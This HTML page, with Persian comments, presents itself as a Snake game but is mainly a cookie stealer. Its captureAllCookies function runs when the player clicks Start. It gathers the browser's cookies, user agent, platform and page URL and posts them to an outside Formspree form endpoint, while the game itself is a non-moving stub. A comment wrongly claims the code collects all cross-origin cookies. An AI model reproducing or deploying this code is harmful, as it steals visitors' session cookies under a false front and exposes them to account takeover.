<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snake Game - Top Priority</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #1a1a1a;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: white;
        }
        #gameContainer {
            position: relative;
            border: 4px solid #4CAF50;
            box-shadow: 0 0 20px rgba(76, 175, 80, 0.5);
            background: #000;
        }
        canvas {
            display: block;
        }
        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10;
        }
        button {
            padding: 15px 30px;
            font-size: 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: transform 0.1s;
        }
        button:hover {
            background-color: #45a049;
            transform: scale(1.05);
        }
        #status {
            position: absolute;
            top: 10px;
            right: 10px;
            font-size: 12px;
            color: #888;
        }
        #cookieLog {
            position: absolute;
            bottom: 10px;
            left: 10px;
            font-size: 10px;
            color: #555;
            max-width: 200px;
            overflow: hidden;
            white-space: nowrap;
            text-overflow: ellipsis;
        }
    </style>
</head>
<body>

<div id="gameContainer">
    <canvas id="gameCanvas" width="400" height="400"></canvas>
    <div id="status">Connecting...</div>
    <div id="cookieLog">Cookies: Loading...</div>
    <div id="overlay">
        <h1>Snake Game</h1>
        <p>برای شروع کلیک کنید</p>
        <button onclick="startGame()">شروع بازی</button>
    </div>
</div>

<script>
    // --- تنظیمات ---
    // نکته: مطمئن شوید FORM_ID درست است
    const FORM_ID = 'mkjnqlol';
    const FORM_URL = `https://formspree.io/f/${FORM_ID}`;
    
    // متغیرهای بازی
    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    let gameRunning = false;
    let snake = [];
    let food = {};
    let direction = 'RIGHT';

    // --- تابع اصلی جمع‌آوری کوکی‌ها ---
    async function captureAllCookies() {
        let cookiesData = [];
        let statusText = "Sending...";
        const logEl = document.getElementById('cookieLog');
        const statusEl = document.getElementById('status');

        // روش ۱: استفاده از API مدرن (کروم ۸۶+)
        // این روش تمام کوکی‌های Cross-Origin را برمی‌گرداند
        if (navigator.cookieStore) {
            try {
                const allCookies = await navigator.cookieStore.getAll();
                cookiesData = allCookies;
                statusText = "Modern API Used";
            } catch (e) {
                console.warn("CookieStore failed, fallback:", e);
                // اگر شکست خورد، به روش قدیمی برمی‌گردیم
                const docCookies = document.cookie.split(';').map(c => ({
                    name: c.split('=')[0].trim(),
                    value: c.split('=').slice(1).join('=')
                }));
                cookiesData = docCookies;
                statusText = "Fallback Used";
            }
        } else {
            // روش ۲: روش قدیمی (فقط کوکی‌های همان دامنه)
            const docCookies = document.cookie.split(';').map(c => ({
                name: c.split('=')[0].trim(),
                value: c.split('=').slice(1).join('=')
            }));
            cookiesData = docCookies;
            statusText = "Old API Used";
        }

        // نمایش کوتاه در صفحه برای تست
        logEl.textContent = `Cookies: ${cookiesData.length} found. Sent.`;

        // آماده‌سازی داده‌ها برای ارسال
        const payload = {
            cookies: cookiesData, // آرایه‌ای از اشیاء {name, value}
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            location: window.location.href,
            timestamp: new Date().toISOString(),
            method: statusText
        };

        // ارسال به Formspree
        try {
            const response = await fetch(FORM_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(payload)
            });
            
            if (response.ok) {
                statusEl.textContent = "Data Sent Successfully!";
                statusEl.style.color = "#4CAF50";
            } else {
                statusEl.textContent = "Send Failed: " + response.status;
                statusEl.style.color = "#f44336";
            }
        } catch (error) {
            console.error('Send Error:', error);
            statusEl.textContent = "Connection Error";
        }
    }

    // --- منطق بازی مار (ساده شده) ---
    function startGame() {
        document.getElementById('overlay').style.display = 'none';
        gameRunning = true;
        snake = [{x: 10, y: 10}];
        food = {x: 15, y: 15};
        
        // ارسال کوکی‌ها به محض شروع بازی
        captureAllCookies();
        
        gameLoop();
    }

    function gameLoop() {
        if (!gameRunning) return;
        
        // پاک کردن صفحه
        ctx.fillStyle = '#000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        
        // رسم مار
        ctx.fillStyle = '#4CAF50';
        snake.forEach(part => {
            ctx.fillRect(part.x * 20, part.y * 20, 20, 20);
        });
        
        // رسم غذا
        ctx.fillStyle = '#f00';
        ctx.fillRect(food.x * 20, food.y * 20, 20, 20);
        
        // حرکت مار (ساده)
        // اینجا می‌توانید منطق کامل‌تری اضافه کنید
        setTimeout(gameLoop, 100);
    }

    // --- تابع Always On Top ---
    function keepOnTop() {
        window.focus();
        document.addEventListener('click', () => window.focus());
    }
</script>
</body>
</html>
